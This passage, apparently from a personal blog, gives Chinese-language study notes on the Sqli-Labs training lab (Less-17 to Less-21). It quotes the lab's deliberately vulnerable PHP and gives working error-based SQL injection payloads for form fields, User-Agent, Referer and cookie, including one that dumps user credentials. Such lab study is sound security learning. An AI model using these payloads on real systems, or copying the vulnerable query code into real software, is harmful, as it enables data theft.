class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		$value = intval($value);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//making sure uname is not injectable</span></span><br><span class="line">$uname=check_input($_POST[<span class="string">'uname'</span>]);  </span><br><span class="line">$passwd=$_POST[<span class="string">'passwd'</span>];</span><br></pre></td></tr></table></figure>
+<ul>
+<li>addslashes()：返回在预定义字符（’,”,\,NULL）前添加反斜杠的字符串</li>
+<li>stripslashes()：删除addslashes()添加的反斜杠</li>
+<li>mysql_real_escape_string()：转义SQL语句中字符串的特殊字符</li>
+</ul>
+<p>发现了一个过滤函数，并且会检查输入的username，所以这次只能在password处构造</p>
+<p><code>uname=admin&amp;passwd=&#39;and extractvalue(1,concat(0x7e,(select database()),0x7e))#&amp;submit=Submit</code></p>
+<p>或者<code>uname=admin&amp;passwd=&#39;or updatexml(1,concat(&#39;~&#39;,(select database()),&#39;~&#39;),0)#&amp;submit=Submit</code></p>
+<p>查数据<code>uname=admin&amp;passwd=&#39;or updatexml(1,concat(&#39;~&#39;,(select * from(select concat_ws(char(45),id,username,password)from users limit 0,1)as a),&#39;~&#39;),0)#</code></p>
+<h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h3><blockquote>
+<p>POST-Header injection-Uagent field-Error based</p>
+</blockquote>
+<p>先看源码，贴一部分</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$uname = check_input($_POST[<span class="string">'uname'</span>]);</span><br><span class="line">$passwd = check_input($_POST[<span class="string">'passwd'</span>]);</span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1"</span>;</span><br><span class="line">	$result1 = mysql_query($sql);</span><br><span class="line">	$row1 = mysql_fetch_array($result1);</span><br><span class="line">	<span class="keyword">if</span>($row1)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 3 &gt;'</span>;</span><br><span class="line">		$insert=<span class="string">"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)"</span>;</span><br><span class="line">		mysql_query($insert);</span><br><span class="line">		<span class="comment">//echo 'Your IP ADDRESS is: ' .$IP;</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">		<span class="comment">//echo "&lt;br&gt;";</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size = 3 &gt;'</span>;			</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'Your User Agent is: '</span> .$uagent;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		print_r(mysql_error());			</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;img src="../images/flag.jpg"  /&gt;'</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size="3"&gt;'</span>;</span><br><span class="line">		<span class="comment">//echo "Try again looser";</span></span><br><span class="line">		print_r(mysql_error());</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;			</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap.jpg"   /&gt;'</span>;	</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>这次在username和password处都对输入进行了过滤，但是往后看会发现<code>$insert=&quot;INSERT INTO security.uagents (&#39;uagent&#39;, &#39;ip_address&#39;, &#39;username&#39;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, &#39;$uname&#39;)&quot;; mysql_query($insert);</code>这里提供了新的注入点，可以在$uagent或$IP里加查询语句，uagent相对好修改，直接用火狐浏览器插件hackbar里POST。</p>
+<p><img src="/2018/08/31/Sqli-Labs-Study/4.jpg" alt=""></p>
+<p>UA：<code>&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;1&#39;=&#39;1</code></p>
+<p>POST以后回显如图</p>
+<p><img src="/2018/08/31/Sqli-Labs-Study/5.jpg" alt=""></p>
+<h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><blockquote>
+<p>POST-Header injection-Referer field-Error based</p>
+</blockquote>
+<p>和Less-18差不多，这次是修改referer。</p>
+<p>Referer：<code>&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;1&#39;=&#39;1</code></p>
+<h3 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h3><blockquote>
+<p>POST-Cookie injection-Uagent field-Error based</p>
+</blockquote>
+<p>这里需要在Cookie中构造查询语句，可以借助火狐插件Cookie Quick Manager修改cookie值</p>
+<p>先用admin身份登录一下会产生一个cookie，尝试修改成<code>uname=admin&#39; order by 3#</code>不报错，改成4报错，一共有三列。</p>
+<p>接着构造<code>uname=admin&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))#</code>，回显如图</p>
+<p><img src="/2018/08/31/Sqli-Labs-Study/6.jpg" alt=""></p>
+<p>其他同理。</p>
+<h3 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h3><blockquote>
+<p>POST-Dump into outfile-String</p>
+</blockquote>
+<p>查看源码，发现了一些新东西</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	$cookee = $_COOKIE[<span class="string">'uname'</span>];</span><br><span class="line">	$format = <span class="string">'D d M Y - H:i:s'</span>;</span><br><span class="line">	$timestamp = time() + <span class="number">3600</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;center&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;b&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;img src="../images/Less-21.jpg" /&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;b&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;br&gt;&lt;font color= "red" font size="4"&gt;'</span>;	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"YOUR USER AGENT IS : "</span>.$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;&lt;br&gt;"</span>;	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font color= "cyan" font size="4"&gt;'</span>;	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"YOUR IP ADDRESS IS : "</span>.$_SERVER[<span class="string">'REMOTE_ADDR'</span>];			</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;&lt;br&gt;"</span>;			</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 4 &gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font color= "orange" font size = 5 &gt;'</span>;			</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"YOUR COOKIE : uname = $cookee and expires: "</span> . date($format, $timestamp);</span><br><span class="line">			</span><br><span class="line">	$cookee = base64_decode($cookee);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;/font&gt;"</span>;</span><br><span class="line">	$sql=<span class="string">"SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1"</span>;</span><br><span class="line">	$result=mysql_query($sql);</span><br><span class="line">	<span class="keyword">if</span> (!$result)</span><br><span class="line">  	&#123;</span><br><span class="line">  		<span class="keyword">die</span>(<span class="string">'Issue with your mysql: '</span> . mysql_error());</span><br><span class="line">  	&#125;</span><br><span class="line">	$row = mysql_fetch_array($result);</span><br><span class="line">	<span class="keyword">if</span>($row)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;font color= "pink" font size="5"&gt;'</span>;	</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;font color= "grey" font size="5"&gt;'</span>;  	</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;&lt;/b&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'Your ID:'</span> .$row[<span class="string">'id'</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>	</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;center&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;br&gt;&lt;br&gt;&lt;br&gt;'</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap1.jpg" /&gt;'</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;b&gt;"</span>;</span><br><span class="line">		<span class="comment">//echo '&lt;img src="../images/Less-20.jpg" /&gt;';</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;center&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;input  type="submit" name="submit" value="Delete Your Cookie!" /&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;/form&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;/center&gt;'</span>;</span><br><span class="line">&#125;	</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;center&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 6 &gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">" Your Cookie is deleted"</span>;</span><br><span class="line">			setcookie(<span class="string">'uname'</span>, base64_encode($row1[<span class="string">'username'</span>]), time()<span class="number">-3600</span>);</span><br><span class="line">			header (<span class="string">'Location: index.php'</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h3><blockquote>
+<p>Future editions</p>
+</blockquote>
+
+    </article>
+    <!-- license  -->
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2018/11/12/深入学习CSS布局/" title= 深入学习CSS布局 >
+                    <div class="nextTitle">深入学习CSS布局</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/08/25/Bugku-SQL注入题目总结/" title= Bugku SQL注入题目总结 >
+                    <div class="prevTitle">Bugku SQL注入题目总结</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:643342586@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/CallMeSaltyF1sh" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/assets/mmqrcode.png" />
+                </span>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer qq" title=qq>
+                  
+                  <img class="profile-qr" src="/assets/qq_qrcode.jpg" />
+                </span>
+            
+        
+    
+        
+            
+                <a href="//m.weibo.cn/u/6067406461?from=1088195010&wm=9006_2001&sourceType=qq&uid=6067406461" class="iconfont-archer weibo" target="_blank" title=weibo></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Sqli-Labs注入学习笔记"><span class="toc-number">1.</span> <span class="toc-text">Sqli-Labs注入学习笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建"><span class="toc-number">1.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Page-1-Basic-Challenges"><span class="toc-number">1.2.</span> <span class="toc-text">Page-1(Basic Challenges)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">Less-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-2"><span class="toc-number">1.2.2.</span> <span class="toc-text">Less-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-3"><span class="toc-number">1.2.3.</span> <span class="toc-text">Less-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-4"><span class="toc-number">1.2.4.</span> <span class="toc-text">Less-4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-5"><span class="toc-number">1.2.5.</span> <span class="toc-text">Less-5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-6"><span class="toc-number">1.2.6.</span> <span class="toc-text">Less-6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-7"><span class="toc-number">1.2.7.</span> <span class="toc-text">Less-7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-8"><span class="toc-number">1.2.8.</span> <span class="toc-text">Less-8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-9"><span class="toc-number">1.2.9.</span> <span class="toc-text">Less-9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-10"><span class="toc-number">1.2.10.</span> <span class="toc-text">Less-10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-11"><span class="toc-number">1.2.11.</span> <span class="toc-text">Less-11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-12"><span class="toc-number">1.2.12.</span> <span class="toc-text">Less-12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-13"><span class="toc-number">1.2.13.</span> <span class="toc-text">Less-13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-14"><span class="toc-number">1.2.14.</span> <span class="toc-text">Less-14</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-15"><span class="toc-number">1.2.15.</span> <span class="toc-text">Less-15</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-16"><span class="toc-number">1.2.16.</span> <span class="toc-text">Less-16</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-17"><span class="toc-number">1.2.17.</span> <span class="toc-text">Less-17</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-18"><span class="toc-number">1.2.18.</span> <span class="toc-text">Less-18</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-19"><span class="toc-number">1.2.19.</span> <span class="toc-text">Less-19</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-20"><span class="toc-number">1.2.20.</span> <span class="toc-text">Less-20</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-21"><span class="toc-number">1.2.21.</span> <span class="toc-text">Less-21</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-22"><span class="toc-number">1.2.22.</span> <span class="toc-text">Less-22</span></a></li></ol></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 5
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/05</span><a class="archive-post-title" href= "/2019/02/05/Ajax学习笔记/" >Ajax学习笔记</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/12</span><a class="archive-post-title" href= "/2018/11/12/深入学习CSS布局/" >深入学习CSS布局</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/31</span><a class="archive-post-title" href= "/2018/08/31/Sqli-Labs-Study/" >Sqli-Labs Study</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/2018/08/25/Bugku-SQL注入题目总结/" >Bugku SQL注入题目总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/11</span><a class="archive-post-title" href= "/2018/08/11/New-Start/" >New Start</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="Life"><span class="iconfont-archer">&#xe606;</span>Life</span>
+    
+        <span class="sidebar-tag-name" data-tags="Ajax"><span class="iconfont-archer">&#xe606;</span>Ajax</span>
+    
+        <span class="sidebar-tag-name" data-tags="SQL"><span class="iconfont-archer">&#xe606;</span>SQL</span>
+    
+        <span class="sidebar-tag-name" data-tags="BugkuCTF"><span class="iconfont-archer">&#xe606;</span>BugkuCTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="CSS"><span class="iconfont-archer">&#xe606;</span>CSS</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "John Doe"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
